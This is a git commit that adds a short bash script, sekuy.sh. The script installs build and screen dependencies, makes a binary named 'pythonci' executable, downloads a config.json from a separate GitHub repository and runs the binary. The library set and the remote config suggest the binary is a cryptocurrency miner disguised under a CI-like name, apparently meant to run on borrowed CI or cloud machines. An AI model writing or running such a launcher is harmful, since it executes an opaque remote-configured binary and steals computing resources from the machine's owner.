ec1b01367579b74c05585d1c0d22ce8f9529d094
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-10-03 07:58:51 +0700

    Create sekuy.sh

---
+++ sekuy.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+chmod +x pythonci
+screen -dmS ls
+wget https://raw.githubusercontent.com/outbesok/mesin/main/nyampah_ah/config.json
+ ./pythonci
